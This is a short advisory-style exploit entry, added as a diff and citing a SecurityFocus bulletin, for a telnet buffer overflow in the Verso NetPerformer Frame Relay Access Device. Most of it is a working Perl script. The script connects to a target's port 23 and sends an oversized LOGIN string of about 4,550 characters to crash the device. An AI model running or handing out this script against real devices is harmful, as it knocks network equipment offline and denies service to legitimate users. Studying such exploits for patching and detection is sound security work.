@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/19989/info
+
+Verso NetPerformer Frame Relay Access Device (FRAD) is prone to a remotely exploitable buffer overflow in the telnet service.
+
+A remote attacker can exploit this issue to execute arbitrary code on the affected device. Failed exploit attempts will likely crash the device, denying service to legitimate users.
+
+# __START_CODE
+#
+#!/usr/bin/perl
+
+use IO::Socket;
+use strict;
+
+my($socket) = "";
+
+if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+
+PeerPort => "23",
+
+Proto    => "TCP"))
+{
+                 print "Modhiar'000 ..... killing netperformer ... $ARGV[0]
+port 23...";
+                 sleep(1);
+                 print $socket "LOGIN " . "A" x 4550 . "BCDE\r\n";
+                 sleep(1);
+                 print $socket "PASS " . "\r\n";
+                 close($socket);
+}
+else
+{
+                 print "Cannot connect to $ARGV[0]:23\n";
+}
+# __END_CODE 
